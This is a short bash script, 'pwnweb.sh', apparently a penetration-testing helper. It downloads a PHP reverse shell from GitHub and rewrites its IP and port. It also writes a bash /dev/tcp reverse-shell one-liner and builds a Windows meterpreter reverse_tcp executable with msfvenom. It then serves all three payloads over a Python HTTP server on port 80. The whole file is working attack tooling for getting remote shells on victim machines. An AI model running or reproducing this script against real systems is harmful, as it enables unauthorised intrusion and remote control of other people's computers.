#!/bin/bash
SCRIPTNAME="pwnweb.sh"

# VARIABLE DEFINTIONS
LHOST="127.0.0.1"
LPORT=443
WEB_PORT=80
INTERFACE=""
DIRECTORY="/tmp/pwnweb"

# Print usage
usage() {
echo -n "$SCRIPTNAME [OPTION]...
main options are described below.
Options:
-h,--help Display this help and exit
-l,--lhost Target IP
-i,--interface Target network interface
-d,--directory Directory to run pwnweb on
"
}

# ARGSPARSER
TEMP=`getopt -o hl:i:d: --long lhost:,interface:,directory: -n "$SCRIPTNAME" -- "$@"`
eval set -- "$TEMP"
while true; do
    case "$1" in
        -h | --help ) usage; exit 1 ;;
        -l | --lhost ) LHOST="$2"; shift 2 ;;
        -i | --interface ) INTERFACE="$2"; shift 2 ;;
        -d | --directory ) DIRECTORY="$2"; shift 2 ;;
        -- ) shift; break ;;
        * ) break ;;
    esac
done

# AUXILIAR FUNCTIONS
check_interface() {
    if [ -d "/sys/class/net/$INTERFACE" ]; then
        LHOST=$(ip -f inet addr show "$INTERFACE" | awk '/inet / {print $2}' | awk -F/ '{print $1}')
    else
        >&2 echo Invalid network interface "$INTERFACE"
        exit 2
    fi
}

check_directory_exists() {
    if [ ! -d "$DIRECTORY" ]; then
        if ! mkdir -p "$DIRECTORY"; then
            >&2 echo Cannot create directory "$DIRECTORY"
            exit 3
        fi
    fi
}

check_files_exists() {
    ## PHP
    REVERSE_PHP="$DIRECTORY/shell.php"
    if  [ ! -z "$REVERSE_PHP" ];then
        wget -q https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O "$REVERSE_PHP"
    fi
    sed -ri 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$LHOST"/ "$REVERSE_PHP"
    sed -ri 's/^\$port = .*/\$port = '$LPORT';/' "$REVERSE_PHP"
    ## BASH
    echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" > "$DIRECTORY/shell.sh"
    ## WINDOWS
    msfvenom -p windows/meterpreter/reverse_tcp lport="$LPORT" lhost="$LHOST" -f exe -o "$DIRECTORY/shell.exe" &>/dev/null
}

run_server() {
    ( cd $DIRECTORY ; python3 -m http.server $WEB_PORT )
}

# MAIN BODY

if [ ! -z "$INTERFACE" ]; then
    check_interface
fi
check_directory_exists
check_files_exists
run_server